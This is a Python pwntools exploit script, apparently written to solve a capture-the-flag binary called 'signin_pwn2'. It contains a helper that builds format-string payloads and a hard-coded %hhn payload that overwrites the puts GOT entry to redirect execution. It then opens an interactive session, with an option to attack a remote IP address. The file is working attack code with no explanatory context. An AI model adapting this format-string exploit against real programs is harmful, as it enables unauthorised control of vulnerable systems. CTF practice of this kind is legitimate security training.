from pwn import *
from pwnlib.util.packing import *


def fmt(prev, word, index):
    fmtstr = ""
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr.encode('utf-8')


def fmt_str(offset, size, addr, target):
    payload = b""
    prev = len(payload)
    for i in range(size):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    for i in range(size):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    return payload


rm = 0
if rm == 1:
    sh = remote('10.214.160.76', 39599)
else:
    sh = process('./signin_pwn2')
# sleep(1)
# gdb.attach(sh)
sh.recv()
bin = ELF('./signin_pwn2')
puts = 0x404018  # bin.got['puts']
# print(hex(puts))
# to 0x4012FF
# print(fmt_str(6, 8, 0x403e18, 0x00007ffff7e03ed0))
addr1 = p64(puts)    # FF 255
addr2 = p64(puts+1)  # 12 18
addr3 = p64(puts+2)  # 40 64
addr4 = p64(puts+3)  # 00 0
addr5 = p64(puts+4)  # 00 0
addr6 = p64(puts+5)  # 00 0
# 0x00401180 to 0x00007ffff7e03ed0
payload = b'%255c%14$hhn%19c%15$hhn%46c%16$hhn%192c%17$hhn%18$hhn%19$hhnffff' + \
    addr1+addr2+addr3+addr4+addr5+addr6

# print(payload)

sh.send(payload)  # ret address
sleep(1)
sh.send(b'123\x00\x00')
sh.interactive()
